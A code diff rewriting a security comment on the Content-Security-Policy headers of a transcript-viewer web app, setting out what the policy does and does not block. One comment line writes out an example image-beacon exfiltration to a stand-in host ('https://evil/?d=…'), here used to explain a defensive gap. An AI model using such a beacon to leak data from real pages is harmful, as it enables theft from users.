@@ -154,12 +154,23 @@ class ChatsMobile {
    */
   setupMiddleware() {
     // Security headers (defense-in-depth). The viewer renders untrusted
-    // transcript content, so even though the server is normally reachable only
-    // from localhost, set a CSP plus the standard hardening headers. The CSP
-    // keeps 'unsafe-inline' for script/style because the viewer relies on inline
-    // handlers and inline <script>; the actual XSS fix is output-escaping in the
-    // renderer. connect-src 'self' limits exfiltration if anything slips
-    // through, and frame-ancestors 'none' blocks clickjacking/framing.
+    // transcript content, and startServer() binds every interface (no host arg
+    // on app.listen) with an opt-in Cloudflare tunnel on top — so treat these
+    // as a real control, not decoration.
+    //
+    // Be honest about what this CSP does and doesn't buy:
+    //   - 'unsafe-inline' stays in script-src/style-src because the viewer is
+    //     built on inline handlers and an inline <script>. That means CSP does
+    //     NOT backstop an injected inline handler. The actual XSS defense is
+    //     output-escaping at the render sites (chats_mobile.html,
+    //     BlockRenderers.js) — this header is a second layer, not the fix.
+    //   - connect-src 'self' blocks fetch/XHR/WebSocket exfiltration, but
+    //     img-src still allows https:, so a pixel beacon
+    //     (new Image().src = 'https://evil/?d=…') is NOT blocked. https: is kept
+    //     because transcripts can embed remote images (BlockRenderers renders
+    //     http(s) image blocks). Narrow it to 'self' data: if that's not needed.
+    //   - frame-ancestors 'none' + X-Frame-Options block clickjacking/framing,
+    //     and object-src 'none' / base-uri 'self' close plugin and <base> vectors.
     this.app.use((req, res, next) => {
       res.setHeader('Content-Security-Policy', [
         "default-src 'self'",
